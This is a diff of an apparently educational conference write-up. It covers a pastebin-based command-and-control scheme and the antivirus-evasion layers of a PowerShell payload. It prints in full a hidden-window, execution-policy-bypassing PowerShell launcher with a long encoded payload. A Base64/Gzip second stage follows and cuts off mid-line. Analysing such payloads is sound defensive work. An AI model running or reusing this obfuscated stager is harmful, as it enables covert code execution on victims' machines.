@@ -1,6 +1,25 @@
-# Command & Control (C2) Attack Analysis - Beginner's Guide
+\
+---
+title: SinCon Shellshock & C2 Attack Analysis
+publishDate: 2025-05-26
+description: 'Writeups for SinCon Shellshock Workshop and C2 Attack Analysis'
+tags:
+  - Conference
+  - SINCON 2025
+  - C2
+  - Shellshock
+  - PowerShell
+  - AV Evasion
+heroImage: { src: './assets/banner.jpg', color: '#ffe5d4'}
+language: 'English'
+---
 
-## What Is This?
+## Command & Control (C2) Attack Analysis - Beginner's Guide
+
+### What Is This?
+
+![Website](./assets/website.png)
+*The pastebin-like website used in the C2 demonstration.*
 
 This analyzes a **Command and Control (C2)** attack that uses a pastebin website to remotely control computers. It was demonstrated in a cybersecurity workshop to teach students about modern hacking techniques.
 
@@ -12,90 +31,94 @@ This analyzes a **Command and Control (C2)** attack that uses a pastebin website
 
 **Simple Analogy:** Like using a library bulletin board to leave secret notes between a spy and their target.
 
-## How C2 Attacks Work
+### How C2 Attacks Work
 
-### The Basic Process
+#### The Basic Process
 1. **Initial Compromise:** Hacker exploits Shellshock bug to break into computer
 2. **Implant Installation:** Plants spy program (`binpaste_client_p1.py`) on victim computer  
 3. **Communication Setup:** Both attacker and victim programs use same pastebin account
 4. **Command & Control:** Continuous cycle of commands and data theft
 
-### Why Use a Website Instead of Direct Connection?
+#### Why Use a Website Instead of Direct Connection?
 - **Stealth:** Looks like normal pastebin usage
 - **Evasion:** Hard to block without affecting legitimate users
 - **No Direct Trail:** Attacker never connects directly to victim
 - **Multiple Victims:** One website can control many computers
 
-**Real-World Impact:** Victim's passwords, files, and personal data get stolen without them knowing.
+**Real-World Impact:** Victim\'s passwords, files, and personal data get stolen without them knowing.
 
-## Communication Protocol (9-Step Process)
+### Communication Protocol (9-Step Process)
 
 ![Communication Process Diagram](./assets/process.jpg)
+*Diagram illustrating the 9-step communication protocol between attacker, C2 server (pastebin), and implant.*
 
-### 🚀 Setup Phase
+#### 🚀 Setup Phase
 **Step 1:** 🔴 **Red Team to binpaste**  
 Initial login (`-u eviluser -p eviluser`)  
-*Attacker's program connects to pastebin and authenticates*
+*Attacker\'s program connects to pastebin and authenticates.*
 
 **Step 2:** 💻 **Implant to binpaste**  
 Initial login (`-u eviluser -p eviluser`)  
-*Victim's spy program also logs into same pastebin account*
+*Victim\'s spy program also logs into same pastebin account.*
 
-### 🔄 Command Execution Cycle
+#### 🔄 Command Execution Cycle
 **Step 3:** 👀 **Implant to binpaste**  
 GET: Polling the main page for new commands  
 *Every 10 seconds, victim computer checks: "Any new orders for me?"*
 
 **Step 4:** 📝 **Red Team to binpaste**  
 POST: Paste the command  
-*Attacker posts command like "list all files" or "steal passwords"*
+*Attacker posts command like "list all files" or "steal passwords".*
 
 **Step 5:** 📥 **Implant to binpaste**  
 GET: Fetch the command  
-*Victim computer finds the command and downloads it*
+*Victim computer finds the command and downloads it.*
 
 **Step 6:** 📤 **Implant to binpaste**  
 POST: Paste the result  
-*Victim executes command and uploads stolen data/results*
+*Victim executes command and uploads stolen data/results.*
 
-### 🧹 Cleanup Phase
+#### 🧹 Cleanup Phase
 **Step 7:** 🗑️ **Implant to binpaste**  
 POST: Delete the command  
-*Victim removes the original command to hide evidence*
+*Victim removes the original command to hide evidence.*
 
 **Step 8:** 📥 **Red Team to binpaste**  
 GET: Fetch the result  
-*Attacker downloads the stolen data/results*
+*Attacker downloads the stolen data/results.*
 
 **Step 9:** 🗑️ **Red Team to binpaste**  
 POST: Delete the result  
-*Attacker removes all traces of the conversation*
+*Attacker removes all traces of the conversation.*
 
-**🔑 Key Feature:** Automatic evidence removal makes detection extremely difficult - it's like the conversation never happened!
+**🔑 Key Feature:** Automatic evidence removal makes detection extremely difficult - it\'s like the conversation never happened!
 
-## Technical Components
+### Technical Components
 
-### Two-Program Architecture
-**Controller (`binpastec2_p1.py`)** - Attacker's command interface
+#### Two-Program Architecture
+**Controller (`binpastec2_p1.py`)** - Attacker\'s command interface
 - Sends commands via pastebin posts
 - Retrieves stolen data from victim computers
 - Can control multiple victims simultaneously
 
-**Agent (`binpaste_client_p1.py`)** - Victim's implant
+**Agent (`binpaste_client_p1.py`)** - Victim\'s implant
 - Polls pastebin every 10 seconds for new commands
 - Executes commands and uploads results
 - Automatically cleans up evidence
 
-### Attack Advantages
+#### Attack Advantages
 - **Legitimate Infrastructure:** Uses real pastebin service
 - **Encrypted Channel:** HTTPS traffic appears normal
 - **Scalable:** One controller handles multiple victims
 - **Persistent:** Continues running until manually removed
 
-## Workshop Context
+### Workshop Context
 
 ![Workshop Setup](./assets/setup.jpg)
+*The workshop setup showing the attacker and victim machines.*
+
 ![Code Modification Example](./assets/modify.jpg)
+*Example of code modification required in the workshop scripts.*
 
 **Educational Demonstration Only:**
 - Controlled environment with test systems
@@ -109,21 +132,21 @@ POST: Delete the result
 - Practice detection and response techniques
 - Learn defensive strategies
 
-## Key Takeaways
+### Key Takeaways
 
-This attack is smart because it looks completely normal - just regular visits to a pastebin website. The hacker doesn't need special servers or suspicious connections. The 10-second check-ins are perfectly timed: fast enough to work well, slow enough to stay hidden.
+This attack is smart because it looks completely normal - just regular visits to a pastebin website. The hacker doesn\'t need special servers or suspicious connections. The 10-second check-ins are perfectly timed: fast enough to work well, slow enough to stay hidden.
 
-What makes this really scary is how it cleans up after itself. Most computer viruses leave clues behind, but this one automatically deletes everything as it goes. It's like having a conversation that erases itself - investigators can't figure out what happened.
+What makes this really scary is how it cleans up after itself. Most computer viruses leave clues behind, but this one automatically deletes everything as it goes. It\'s like having a conversation that erases itself - investigators can\'t figure out what happened.
 
 ---
 
 The Shellshock workshop also covered methods used by attackers to evade antivirus detection with their payloads. The following analysis, also part of the workshop materials, delves into PowerShell-based AV evasion techniques.
 
-# PowerShell Payload AV Evasion Analysis
+## PowerShell Payload AV Evasion Analysis
 
 This document analyzes the multi-layered techniques a PowerShell payload uses to evade Antivirus (AV) detection, primarily through obfuscation and in-memory execution.
 
-## Initial Encoded Command
+### Initial Encoded Command
 
 The attack begins with a heavily obfuscated PowerShell command, executed stealthily:
 
@@ -131,30 +154,9 @@ The attack begins with a heavily obfuscated PowerShell command, executed stealth
 powershell.exe -NoLogo -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -EncodedCommand aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAkAGUAbgB2ADoAdwBpAG4AZABpAHIAKwAnAFwAcwB5AHMAbgBhAHQAaQB2AGUAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQBlAGwAcwBlAHsAJABiAD0AJwBwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAJwB9ADsAJABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG9jAGUAcwBTAHQAYQByAHQASQBuAGYAbwA7ACQAcwAuAEYAaQBsAGUATgBhAG0AZQA9ACQAYgA7ACQAcwAuAEEAcgBnAHUAbQBlAG4AdABzAD0AJwAtAG4AbwBwACAALQB3ACAAaABpAGQAZABlAG4AIAAtAGMAIAAmACgAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAYwByAGUAYQB0AGUAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4ATQBlAG0AbwJ5AFMAdAByAGUAYQBtAFIAZQBhAG0AKAAuAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAoACgAJwAnAEgANABzAEkAQQBQAHQASQBMAFcAZwBDAEEANwBWAFgAYgBXACsAYgBTAEIARAArAFgAcQBuAC8AQQBWAFcAVwBqAEYAWABIAEwANgBtAFQAcABwACcAJwArACcAJwBFAGkAMwBXAEoARABqAEcAcwBuAEoAaABqAGMAMgBMAFYATwBHAEIAYgBZAGUAQQAwAEUARgB0AHUAawAxAC8AOQArAHMAeABqAHkAbwBqAHAAMwB1AHsAMQB9AE8ASwBoAE0AegB1AHoAcwB6AE8AUAB2AFAATQB6AE4AcABOAEEANQB1AFIATQBCAEEAaQBTAHgAewAxAH0AKwB2AEgAOABuAEYATQAvAFkAaQBxADIAMQBJAEYAYgB1AEIAaQBkADEAbwBXAEwAOQBPAFUARwBuAHQAYQBmAFYAUwBuAFEAagBuADYAMgBFAEMAMABHAGMAbwB5AGoAcQBoAFcAdQBMAEIASQB2ACcAJwArACcAJwB6ADgAMgA0AGEAeAB6AGgAZwArADMASABqAEUAagBPAFUASgBIAGkAOQBwAEEAUQBuAFkAawAzADQAUwA1AGoANgBPAE0AewAxAH0ASAAxADgAcwA3AGIARABQAGgAaAAxAEQANQBzADMARgBKAHcANgBWAEYAQwA3AEcAcwBhADkAawArAEYAbwA1AFEANABQAEMAMQBZAFcAaABiADMATABXAEcASABsAEgAQwB4AE8AcgAzADcAOQBYAGEALwBLAGkAOQBhAE0AagAzAHEAVQBVAFQAcwBhAHAAbgBDAGMAUAByAGgAawAnACcAKwAnACcATgBwAHQAUwBiADgAcgBQAEUATgBKADEAbQBFAHgAZQBxAEkAMgBIAEcAWQBoAEMANQByAFQARQBuAHcANgBiAGgAaABCAEkAbgBsADQAaQB1AHcAdABzAEUAagB6AFAAegBRAFMAYQBwAHcAbQBxAGYAegB4AEoAaQBsAGMAVgBBAGMAaQA5AHYAewAxAH0AUwA0AGwAVgArAEIAegBIAG8AWQAwAGMASgA4AHsAMQB9AEoAVQBxADAATABjADcANwBEAGYATABIADQAUQA1AHcAWAAyADkAKwBrAEEAUwBOAHIAMwBGAEEARABoAHUATQB3ADAAbgBHADgASQBUAHsAMQB9AE8ARwBuADAAcgBjAEMAaQArAHcAZQA0AEMAdABIAFEAVwBrADgAQgBiADEARwBvAGcAdABnAGwAWABXAEsAdwBFAEsAYQBWADEANABiACsAWQBFAGEALwB3AHQAZwBUAHYAcgBVAHIAaQBjAHkAVwBRAEcAcgBPADQAVgBvAGUAdwBIAGoAcgBvAEsASABSAFMAaQB2AGUAcQAxAFEATwBlAGMAaQA3AFUANABIAG4AawBBACcAJwArACcAJwAwAEQANABrADYAUABvAGwAaAAnACcAKwAnACcAegBhAGYASgBzAGQANABOAEQAVABSAFAAbgBNADgAeABVAE0AUABvAHYAagBNAEMARwA1ADcAbwBYAFEAcQBnAHMAagAyAE4AeABpAFkAewAxAH0AegBCAHMARABLAEoAVQAxAHgAYgBQAEMASQB1AFYATwB3AG8ATwBBAG4AcgBiAHoAWABYAEwAbgBWAEIATQA3AE8AWABNAEQATQAzAFEAKwBJAHMAbgB2AFIAZgBVAEsAQgBpAFgAYgBwAGMANQBuAFUAKwA5ADcAQgBMAEEAdAB6AEwAQQBtAHQATgA3AEoASwB5ADQAcQBHAG8AWQBKAGYAaQBIAEoARgBHAEsAWABZAEYALwBvAG4AVgBZAGcARQA3AFAAVQB5AHgAewAxAH0AegBFAE8ATQB5AGYASABMADIAcgB5AG0AcgBCAEgAWABTAGsAbAAxAE0ARQB4AHMAaQBHAHkAQwBYAGcARgBRAGEAKwA5AGQARwBZAGYATwBiAEcAcQBCAGkATwA4AEIAdgBUADIAWQAyAEIAcgB4AFkAVgBFAHcAYQBWADAAawBSAHgAewAxAH0AdQBUAHMAZgBnADEAQwAxAFMANgAwAGsAcQBRAHYAagBGAEQATABWAHIAZwBzADYAdABpAGgAMgA2AGcASQBLAEUAbABJAHMAbwB7ADEAfQBTAEYAKwBXAGYAMQB5AGQAMQBSAFMAaABtAHgAcgBZAFMAVgA1AGgAYQAxAGwAMgBnAFcAdQAzAGIARABJAEcARgB4AGEAawBOAFkAQQBZAEcASgAnACcAKwAnACcASABtAEcAYgBXAEoAUQBEAFUAaABmADYAeABNAEYAUwBwAGgATwB2ADMATAAxADYARQBJADYAdQBSAFMAbQBrAEQAMQBqAGEAUQBEAGgAZwBoAHMATwBnAE0AMAA2AFcARwBCAHoAZABFADYAUABXADAARABGAFQAMQB4AEgARgBhAHgARABLAEsANABkAEMATABRAC8AcQBSAEoARQBsAE8AYgAwAHMARAB6AHYAJwAnACsAJwAnAFYAdwA0ADYAVwBxAGIARABuAFAAUQBlAG0AUgBPAFMAewAxAH0AbQB4AEIAdABuAFkAYQBzAEwAcABnAGsAewAxAH0AbABDAEcATwBNAGoAQQByAHYALwBuAHgASwA4AEYAaQBIAHYAVABqAFgARQBSAEgATABIAE0AcwBMAG0AVQBNAHsAMQB9ADQARABsAFUAUwAvAFYAVABzAEwAQwA0AHgAeQBSAEcASQBHAGEAQwBoAHgAdQBKAGEAJwAnACsAJwAnAHMAQgBKADkAMgA5AHEAVgBHAC8ATgBDAFUAUwBlADkAawAzAEEAdQAzAEMAQgA1AHsAMQB9AHUAZABGAE0AUwBUAGYATQBtAFQAcAB5AEIAbABSAFgAbQBYADQAcgBrADYASABoACsAeQBwAHAAcQB4ADYAJwAnACsAJwAnAE0ATQAwAFAAMgB4AHEAdwBWAGYAewAxAH0AMQBNACsAZwBPADkAMQAwAGQAeABiACsAZQA3AFMARQAxAFUAdQBTADkAbABXAGwAdABDAGQAcAA5ADgATgBnAGUAUwBZAFkAQQBlADYAUQA2ADEAdQA1ADIASwBuAE8ANwBRAFUAegAzAFkAUQBGAEoAOQBXADIAcgBOAFcAcAA3AFUAVQByAHAARABYAGYASgBsADAAawBLAGUAcgB2AFcAMQBUAG4AdQBtAE4AcwArAG8AUgBCADUAMABWACcAJwArACcAJwBVAGYAOQA2AGEAUAA5AFIANwB0AHkAcAA5AFAALwB0AHAAdQBnAHEAOQBFAEEAKwBjAHEAMQBvADcAUwBQAGwAVgB4AC8AeABmAFYAbgBxADgAdABoAFQAOAA3AEgATgBoADkAcgB0ADQAbABNAHsAMQB9AE4AaABIAFYAbQA0ADEAMAA4AGQAVABNADUASwBtAHMAagBMAFQAegBFAGoAMQBQAG0ANAA5AHoAUgB3ACcAJwArACcAJwAyAE8ANABvAHYAJwAnACsAJwAnAHcAYgB4AEsAZABzAFAASQBiAE0ATABUAGIAZwA4ADIAZwBmAE0AdwBvAG0AJwAnACsAJwAnAGMAUABJADMAQgBYAE0AMgBjAEQAZwBtAGUAcQBoAHoATQBQAGEAUQBqAHAAdAB3AEgAVgBsADkAcwB1AGsAaABRAGIANwBmAEUAeQBZAEcANAAxAFUAWQBPAGQAdABvAHgARwBUAG4AYgBiAGIAMwA0AHgAUgB3AFIASABJAGQASgBrAGgAQgBRAEsAVwBiAGwARwAxAHIAYgBYAGIASgB1AFMAeABzADgARQAnACcAKwAnACcATAA5AEwASABUAGEAUwAnACcAKwAnACcAcgBRAGIAZgA0AGwAYgBSAGwAZgAnACcAKwAnACcATgAvADcAMAB2AFIAQQBWAHkAVwAyAGMAeQArAEQAegAyAEMAVAB3AE4AbwBKAHIASABXAFAASAA1AHkAQQByADAARgBNAFYATwBLAEMAegBkAGkATgByAHMAZgBnAHIAdABIAGEAYgBXAFYAdgAxADEAcQBSAHcAVQBmAGoAOAB0AFMANQAzAG4ANwB1AHUARQAyAFQANgA4AEgAYgBCADUALwBhAHkAMQBYAGIANQA3AHEAZQByAFgAcwBJAHoAcQBRAHYALwBiAHYAbABWAEUATwBGAC8AeAByAEUAVwB5AFYANAA4AE0AMQBzAE8AMQBjAGoAVwA3AHIAdgBtAFYAUQB5AHIAbwBkAG4AcwA4AFMAUgBCADQAbwBtAEkAWQBOAGMAMwBYAFMAMQAyADUAMABuAGgAVwBCAHoARABjAHUAUwBzACcAJwArACcAJwBkAGMAYgBOAE0ALwA0AGQAOQBEAE0ANQBPAFAAQgAxAHMAagBnAHYAVAB6AEYAOQByAGIAcABiADgAQwBIAFgAbAArAEgAOAAzADAAbAAyAHgATQBwADkAVQBpAC8AUAB3AFUATQBsAHAAcwB0AHMAdwB7ADEAfQBUAGIAWABtAC8AcABzAHQAagBKAC8AZgByAFQAQQB2AEgAYQBIAGIAVwBEAFgAdQBmAE8AMwAxAEQAUwBWAHYAMgB4AEYANQAvAHUAZQBmAFkARQBTAGQAdQB0AHIAVwBMAGkAdwA5AEEAOABMAGwAQgBBAHYAYgBwAGUARgBGAHgAagA5AHUAVwB6AHYAdgBBACsAMwBjAFYAUgB6AE4ARwB6ADMAagArAFcAcAA4AGIAVwBYAEgAaQBXAHgAVAA0AEQALwAyAHIAcgBFAE4ASwBHAEMAdABGAFIAeABxAEgAaABHAHUASQBJAHIALwBkAHIASABBAGMAWQBBAHIAWABBAGIAZwB3AGwATwBtAEwASwBBADEAdAAzAGgARgA1ADYANABKAG0AdgBHACsAUgB2AEcATQBiAGEAdQA3AFYAbwBhACsAYQA4AEMAaABZAGUAKwBxAFQANQBkAFQANQArAFEAeAA4AGgASQBMAEEAYwA3AFUAeAB4AEkASABIAC8ASABwAHIAOQA2AG4AVgBnAGcAYgBYADIAcgBVADYAZQBlAEsALwAvAFcAVABkAE0ATQByAEUAMwBGAGkAZAB0ADgAZwBjAG0AdABJADYAegBhADIAJwAnACsAJwAnAEQAUQBlAEkASwBvAHYAagBiADAAWQBLAHIARQBJAE8AUwAvAEMAcABlAHIAMABFAEgATwA2ACsAZwBnAEUASgBGADMAMQBjADEARABxAEEAVQBoAHYAUQA1AGYATQBXADUASAB0AG4AdwBIAEQAMgBBAHIAUQAxAEgAbgAvAE4AYgAwAEoANABtAFkATwBJAEkAMwB3AHMAJwAnACsAJwAnAFYAeAB1ADgASQB6ACsAOABjAEYAUwB1AEoAZgB5AHQAeABpAHUAcgBzAHcANAAvAHoATAA4AFIANQBtAHYAdQBIADEAVABlAFIAcQBWAFgAZgB3AC8AUABMADkATQB1AEoAewAxAH0AMwAzAHQAJwAnACsAJwAnADkAdwBFAHcAJwAnACsAJwAnAHQAUQBnAEQAUQBSADIAYQBEAE0AWAA3AGkAOAA5AEIASABJAHAAYwBlAFIAewAxAH0AaABDAEEAMABrAGcAbABzADgALwBBAC8AQgBkAGMAcQBPAHIAdQBCADYAbQBiAGUANQB2AHcARgBiAE4ARQBxAHUAaQB3AHcAQQBBAEEAewAwAH0AewAwAH0AJwAnACkALQBmACcAJwA9ACcAJwAsACcAJwBaACcAJwApACkAKQApACwAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAKQApACcAOwAkAHMALgBVAHMAZQBTAGgAZQBsAGwARQB4AGUAYwB1AHQAZQA9ACQAZgBhAGwAcwBlADsAJABzAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABPAHUAdABwAHUAdAA9ACQAdAByAHUAZQA7ACQAcwAuAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQA9ACcASABpAGQAZABlAG4AJwA7ACQAcwAuAEMAcgBlAGEAdABlAE4AbwBXAGkAbgBkAG8AdwA9ACQAdAByAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFMAdABhAHIAdAAoACQAcwApADsA
 ```
 
-This command uses `powershell.exe` with parameters like `-WindowStyle Hidden` (to hide the window), `-ExecutionPolicy Bypass` (to bypass execution restrictions), and `-NoProfile` (to avoid loading user profiles). The crucial part is `-EncodedCommand`, which contains a Base64 encoded string. Decoding this string reveals the first-stage PowerShell script. This initial deobfuscation step is illustrated below:
-
-![Deobfuscation of the initial EncodedCommand](./assets/evasiondecryptone.png)
-
-The primary purpose of this first-stage script is to deobfuscate and execute the subsequent stage of the payload.
-
-## Deobfuscating the First-Stage Script's Payload
-
-The first-stage script (obtained by decoding the initial `EncodedCommand`) carries an embedded payload. This payload is a large Base64 encoded string that, when decoded, reveals Gzip-compressed data. Decompressing this data—referred to as the "manual method"—yields the second-stage PowerShell script. This second-stage script is responsible for the final in-memory shellcode execution.
-
-The deobfuscation steps for this embedded payload are:
-1.  Decode the Base64 string extracted from the first-stage script.
-2.  Treat the resulting byte array as a Gzip stream and decompress it.
-3.  Interpret the decompressed bytes as a UTF-8 string, which forms the second-stage PowerShell script.
-
-The logic for this deobfuscation is often embedded within the first-stage script itself, typically using a structure like this:
-
-```powershell
-[scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((("H4sIAPtILWgCA7VXbW+bSBD+Xqn/AVWWjFXHL6mTpp"+"Ei3WJDjGsnJhjc2LVOGBbYeA0EFtuk1/9+sxjyojp3u{1}OKhMzuzszOPvPMzNpNA5uRMBAiSx{1}+vH8nFM/Yiq21IFbuBid1oWL9OUGntafVSnQjn62EC0GcoyjqhWuLBIv"+"z824axzhg+3HjEjOUJHi9pAQnYk34S5j6OM{1}H18s7bDPhh1D5s3FJw6VFC7Gsa9k+Fo5Q4PC1YWhb3LWGHlHCxOr379Xa/Ki9aMj3qUUTsapnCcPrhk"+"NptSb8rPENJ1mExeqI2HGYhC5rTEnw6bhhBInl4iuwtsEjzPzQSapwmqfzxJilcVAci9v{1}S4lV+BzHoY0cJ8{1}JUq0Lc77DfLH4Q5wX29+kASNr3FADhuMw0nG8IT{1}OGn0rcCi+we4CtHQWk8Bb1GogtglXWKwEKaV14b+YEa/wtgTvrUricyWQGrO4VoewHjroKHRSiveq1QOeci7U4HnkA"+"0D4k6Polh"+"zafJsd4NDTRPnM8xUMPovjMCG57oXQqgsj2NxiY{1}zBsDKJU1xbPCIuVOwoOAnrbzXXLnVBM7OXMDM3Q+IsnvRfUKBiXbpc5nU+97BLAtzLAmtN7JKy4qGoYJfiHJFGKXYF/onVYgE7PUyx{1}zEOMyfHL2rymrBHXSkl1MExsiGyCXgFQa+9dGYfObGqBiO8BvT2Y2BrxYVEwaV0kRx{1}uTsfg1C1S60kqQvjFDLVrgs6tih26gIKElIso{1}SF+Wf1yd1RShmxrYSV5ha1l2gWu3bDIGFxakNYAYGJ"+"HmGbWJQDUhf6xMFSphOv3L16EI6uRSmkD1jaQDhghsOgM06WGBzdE6PW0DFT1xHFaxDKK4dCLQ/qRJElOb0sDzv"+"Vw46WqbDnPQemROS{1}mxBtnYasLpgk{1}lCGOMjArv/nxK8FiHvTjXERHLHMsLmUM{1}4DlUS/VTlLC4xyRGIGaChxuJa"+"sBJ929qVG/NCUSe9k3Au3CB5{1}udFMSTfMmTpyBlRXmX4rk6Hh+yppqx6"+"MM0P2xqwVf{1}1M+gO910dxb+e7SE1UuS9lWltCdp98NgeSYYAe6Q61u52KnO7QUz3YQFJ9W2rNWp7UUrpDXfJl0kKervW1TnumNs+oRB50V"+"Uf96aP9R7typ9P/tpugq9EA+cq1o7SPlVx/xfVnq8thT87HNh9rt4lM{1}NhHVm4108dTM5KmsjLTzEj1Pm49zRw"+"2O4ov"+"wbxKdsPIbMLTbg82gfMwom"+"cPI3BXM2cDgmeqhzMPaQjptwHVl9sukhQb7fEyYG41UYOdtoxGTnbbb34xRwRHIdJkhBQKWblG1rbXbJuSxs8E"+"L9LHTaS"+"rQbf4lbRlf"+"N/70vRAVyW2cy+Dz2CTwNoJrHWPH5yAr0FMVOKCzdiNrsfgrtHabWVv11qRwUfj8tS53n7uuE2T68HbB5/ay1Xb57qerXsIzqQv/bvlVEOF/xrEWyV48M1sO1cjW7rvmVQyrodns8SRB4omIYNc3XS1250nhWBzDcuSs"+"dcbNM/4d9DM5OPB1sjgvTzF9rbpb8CHXl+H830l2xMp9Ui/PwUMlpstsw{1}TbXm/pstjJ/frTAvHaHbWDXufO31DSVv2xF5/uefYESdutrWLiw9A8LlBAvbpeFFxj9uWzvvA+3cVRzNGz3j+Wp8bWXHiWxT4D/2rrENKGCtFRxqHhGuIIr/drHAcYArXAbgwlOmLKA1t3hF564JmvG+RvGMbau7Voa+a8ChYe+qT5dT5+Qx8hILAc7UxxIHH/Hpr96nVggbX2rU6eeK//WTdMMrE3Fidt8gcmtI6za2"+"DQeIKovjb0YKrEIOS/Cper0EHO6+ggEJF31c1DqAUhvQ5fMW5HtnwHD2ArQ1Hn/Nb0J4mYOII3ws"+"Vxu8Iz+8cFSuJfytxiursw4/zL8R5mvuH1TeRqVXfw/PL9MuJ{1}33t"+"9wEw"+"tQgDQR2aDMX7i89BHIpceR{1}hCA0kgls8/A/BdcqOruB6mbe5vwFbNEquiwwAAA{0}{0}")-f"=","Z")))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd())
-```
-
 This deobfuscation can also be performed manually for analysis, using the Base64 string from the first-stage script, to obtain the second-stage script:
 ```powershell
-$compressed = ((("H4sIAPtILWgCA7VXbW+bSBD+Xqn/AVWWjFXHL6mTpp" + "Ei3WJDjGsnJhjc2LVOGBbYeA0EFtuk1/9+sxjyojp3u{1}OKhMzuzszOPvPMzNpNA5uRMBAiSx{1}+vH8nFM/Yiq21IFbuBid1oWL9OUGntafVSnQjn62EC0GcoyjqhWuLBIv" + "z824axzhg+3HjEjOUJHi9pAQnYk34S5j6OM{1}H18s7bDPhh1D5s3FJw6VFC7Gsa9k+Fo5Q4PC1YWhb3LWGHlHCxOr379Xa/Ki9aMj3qUUTsapnCcPrhk" + "NptSb8rPENJ1mExeqI2HGYhC5rTEnw6bhhBInl4iuwtsEjzPzQSapwmqfzxJilcVAci9v{1}S4lV+BzHoY0cJ8{1}JUq0Lc77DfLH4Q5wX29+kASNr3FADhuMw0nG8IT{1}OGn0rcCi+we4CtHQWk8Bb1GogtglXWKwEKaV14b+YEa/wtgTvrUricyWQGrO4VoewHjroKHRSiveq1QOeci7U4HnkA" + "0D4k6Polh" + "zafJsd4NDTRPnM8xUMPovjMCG57oXQqgsj2NxiY{1}zBsDKJU1xbPCIuVOwoOAnrbzXXLnVBM7OXMDM3Q+IsnvRfUKBiXbpc5nU+97BLAtzLAmtN7JKy4qGoYJfiHJFGKXYF/onVYgE7PUyx{1}zEOMyfHL2rymrBHXSkl1MExsiGyCXgFQa+9dGYfObGqBiO8BvT2Y2BrxYVEwaV0kRx{1}uTsfg1C1S60kqQvjFDLVrgs6tih26gIKElIso{1}SF+Wf1yd1RShmxrYSV5ha1l2gWu3bDIGFxakNYAYGJ"+"HmGbWJQDUhf6xMFSphOv3L16EI6uRSmkD1jaQDhghsOgM06WGBzdE6PW0DFT1xHFaxDKK4dCLQ/qRJElOb0sDzv"+"Vw46WqbDnPQemROS{1}mxBtnYasLpgk{1}lCGOMjArv/nxK8FiHvTjXERHLHMsLmUM{1}4DlUS/VTlLC4xyRGIGaChxuJa"+"sBJ929qVG/NCUSe9k3Au3CB5{1}udFMSTfMmTpyBlRXmX4rk6Hh+yppqx6"+"MM0P2xqwVf{1}1M+gO910dxb+e7SE1UuS9lWltCdp98NgeSYYAe6Q61u52KnO7QUz3YQFJ9W2rNWp7UUrpDXfJl0kKervW1TnumNs+oRB50V"+"Uf96aP9R7typ9P/tpugq9EA+cq1o7SPlVx/xfVnq8thT87HNh9rt4lM{1}NhHVm4108dTM5KmsjLTzEj1Pm49zRw"+"2O4ov"+"wbxKdsPIbMLTbg82gfMwom"+"cPI3BXM2cDgmeqhzMPaQjptwHVl9sukhQb7fEyYG41UYOdtoxGTnbbb34xRwRHIdJkhBQKWblG1rbXbJuSxs8E"+"L9LHTaS"+"rQbf4lbRlf"+"N/70vRAVyW2cy+Dz2CTwNoJrHWPH5yAr0FMVOKCzdiNrsfgrtHabWVv11qRwUfj8tS53n7uuE2T68HbB5/ay1Xb57qerXsIzqQv/bvlVEOF/xrEWyV48M1sO1cjW7rvmVQyrodns8SRB4omIYNc3XS1250nhWBzDcuSs"+"dcbNM/4d9DM5OPB1sjgvTzF9rbpb8CHXl+H830l2xMp9Ui/PwUMlpstsw{1}TbXm/pstjJ/frTAvHaHbWDXufO31DSVv2xF5/uefYESdutrWLiw9A8LlBAvbpeFFxj9uWzvvA+3cVRzNGz3j+Wp8bWXHiWxT4D/2rrENKGCtFRxqHhGuIIr/drHAcYArXAbgwlOmLKA1t3hF564JmvG+RvGMbau7Voa+a8ChYe+qT5dT5+Qx8hILAc7UxxIHH/Hpr96nVggbX2rU6eeK//WTdMMrE3Fidt8gcmtI6za2"+"DQeIKovjb0YKrEIOS/Cper0EHO6+ggEJF31c1DqAUhvQ5fMW5HtnwHD2ArQ1Hn/Nb0J4mYOII3ws"+"Vxu8Iz+8cFSuJfytxiursw4/zL8R5mvuH1TeRqVXfw/PL9MuJ{1}33t"+"9wEw"+"tQgDQR2aDMX7i89BHIpceR{1}hCA0kgls8/A/BdcqOruB6mbe5vwFbNEquiwwAAA{0}{0}") -f"=","Z"))
